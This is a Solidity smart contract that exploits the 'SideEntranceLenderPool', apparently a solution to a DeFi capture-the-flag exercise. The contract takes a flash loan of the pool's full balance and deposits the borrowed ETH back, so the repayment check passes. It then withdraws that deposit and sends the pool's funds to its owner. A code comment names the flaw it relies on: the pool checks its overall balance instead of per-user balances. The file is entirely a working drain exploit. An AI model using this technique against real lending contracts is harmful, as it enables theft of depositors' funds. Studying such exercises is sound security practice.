// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function flashLoan(uint256 amount) external;

    function withdraw() external;
}

contract SideEntranceLenderPoolExploiter {
    ISideEntranceLenderPool lenderPool;
    address payable owner;

    constructor(address _owner, address lenderPool_) {
        owner = payable(_owner);
        lenderPool = ISideEntranceLenderPool(lenderPool_);
    }

    function execute() external payable {
        lenderPool.deposit{value: msg.value}();
    }

    /**
     * @notice  Start the exploit
     *          We leverage the fact the ETH lender pool do not
     *          check the balance of the user after the flashloan but the general balance.
     *          We can also withdraw at any time.
     */
    function startExploit() external {
        lenderPool.flashLoan(address(lenderPool).balance);
        lenderPool.withdraw();
        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}
